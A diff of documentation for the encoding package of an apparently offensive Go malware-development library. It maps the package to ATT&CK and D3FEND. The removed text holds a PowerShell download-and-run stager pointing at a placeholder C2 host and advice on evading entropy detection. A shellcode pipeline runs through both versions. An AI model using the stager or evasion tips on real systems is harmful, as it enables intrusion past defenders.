@@ -1,88 +1,59 @@
-# Encode
-
-Lightweight, **non-secret** transformations for moving payloads through channels that don't tolerate arbitrary bytes. The `encode` package is the companion to `crypto`: first you encrypt (confidentiality), then you encode (transport safety).
-
-**MITRE ATT&CK:**
-- [T1027.013 - Obfuscated Files or Information: Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013/)
-- [T1140 - Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)
-
+---
+last_reviewed: 2026-04-27
+reflects_commit: f815d85
 ---
 
-## When to use encode vs crypto
+# Encode techniques
 
-| Goal | Use |
-|------|-----|
-| Keep payload secret from static analysis | `crypto` (AES-GCM / ChaCha20) |
-| Break signature/YARA byte patterns | `crypto` obfuscation layer (TEA / SBox / Matrix) |
-| Survive transport that mangles bytes (stdin, HTTP headers, JSON strings, PowerShell `-EncodedCommand`) | `encode` |
-| Embed a binary blob in source code | `encode.Base64Encode` |
-| Hand a script to `powershell.exe -EncodedCommand` | `encode.PowerShell` |
+[← maldev README](../../../README.md) · [docs/index](../../index.md)
 
-**Encoding is never confidentiality.** Base64 is trivially reversible. Encode what has already been encrypted.
+The `encode/` package provides **transport-safe** byte transformations:
+Base64 (standard + URL-safe), UTF-16LE, ROT13, and the
+PowerShell `-EncodedCommand` format. Encoding is never confidentiality —
+it survives channels that mangle arbitrary bytes (HTTP headers, JSON
+strings, PowerShell command lines, stdin pipes).
 
----
+## TL;DR
 
-## API
-
-```go
-// Standard Base64 (RFC 4648 §4) — padded with '='
-func Base64Encode(data []byte) string
-func Base64Decode(s string) ([]byte, error)
-
-// URL-safe Base64 (RFC 4648 §5) — uses '-' and '_'; safe in URLs and filenames
-func Base64URLEncode(data []byte) string
-func Base64URLDecode(s string) ([]byte, error)
-
-// UTF-16 Little-Endian — the wire format PowerShell, LSASS, and the PEB use
-func ToUTF16LE(s string) []byte
-
-// PowerShell = Base64(UTF16LE(script)) — input format for powershell -EncodedCommand
-func PowerShell(script string) string
-
-// ROT13 — novelty/steg only; breaks byte signatures for ASCII-dominant data
-func ROT13(s string) string
+```mermaid
+flowchart LR
+    PT[plaintext] -->|encrypt| ENC[crypto.EncryptAESGCM]
+    ENC -->|then encode| B64[encode.Base64Encode]
+    B64 --> WIRE[ship over HTTP / JSON / PS]
+    WIRE -.unwrap.-> B64D[encode.Base64Decode]
+    B64D --> DEC[crypto.DecryptAESGCM]
+    DEC --> PAYLOAD[shellcode]
 ```
 
----
+Encrypt first, then encode. Decode last, then decrypt.
 
-## Integration Example
+## Packages
 
-Encrypt first, then encode for a transport channel:
+| Package | Tech page | Detection | One-liner |
+|---|---|---|---|
+| [`encode`](../../../encode) | [encode.md](encode.md) | very-quiet | Base64 (std + URL), UTF-16LE, ROT13, PowerShell `-EncodedCommand` |
 
-```go
-import (
-    "github.com/oioio-space/maldev/crypto"
-    "github.com/oioio-space/maldev/encode"
-)
+## Quick decision tree
 
-// 1. Encrypt raw shellcode with AES-GCM.
-key, _ := crypto.NewAESKey()
-ciphertext, _ := crypto.EncryptAESGCM(key, rawShellcode)
+| You want to… | Use |
+|---|---|
+| …embed a binary blob in Go source / JSON / HTTP header | [`encode.Base64Encode`](encode.md#base64encodedata-byte-string) |
+| …pass a payload through a URL or filename | [`encode.Base64URLEncode`](encode.md#base64urlencodedata-byte-string) |
+| …feed a Windows API that takes UTF-16 LPWSTR | [`encode.ToUTF16LE`](encode.md#toutf16les-string-byte) |
+| …run a PowerShell script via `-EncodedCommand` | [`encode.PowerShell`](encode.md#powershellscript-string-string) |
+| …break a static string signature on Win32 API names | [`encode.ROT13`](encode.md#rot13s-string-string) (novelty) |
 
-// 2. Base64-encode for embedding in Go source / JSON / HTTP header.
-embedded := encode.Base64Encode(ciphertext)
+## MITRE ATT&CK
 
-// 3. On the other side:
-raw, _   := encode.Base64Decode(embedded)
-stage, _ := crypto.DecryptAESGCM(key, raw)
-_ = stage // inject
-```
+| T-ID | Name | Packages | D3FEND counter |
+|---|---|---|---|
+| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | `encode` (PowerShell, Base64) | D3-SEA |
+| [T1027.013](https://attack.mitre.org/techniques/T1027/013/) | Encrypted/Encoded File | `encode` (Base64 wrapper for ciphertext) | D3-FCR |
+| [T1140](https://attack.mitre.org/techniques/T1140/) | Deobfuscate/Decode Files or Information | `encode.Base64Decode`, `encode.Base64URLDecode` | D3-FCR |
 
-For PowerShell stagers:
+## See also
 
-```go
-script := `IEX (New-Object Net.WebClient).DownloadString('http://c2/s')`
-cmd := encode.PowerShell(script)
-// exec.Command("powershell.exe", "-EncodedCommand", cmd)
-```
-
----
-
-## Detection
-
-**None intrinsic.** Base64 strings are high-entropy but extremely common in legitimate code. Defenders watch for the _combination_:
-- Long Base64 string passed to `-EncodedCommand`
-- Base64 → reflective load via `System.Reflection.Assembly`
-- UTF-16LE content in a text-configured channel
-
-Mitigation from the operator side is composition: encode *after* encrypting, and chunk long strings to avoid entropy-per-line heuristics.
+- [`crypto`](../crypto/README.md) — confidentiality layer (encrypt
+  before encoding).
+- [Operator path: stagers and encoders](../../by-role/operator.md)
+- [Detection eng path: `-EncodedCommand` hunting](../../by-role/detection-eng.md)
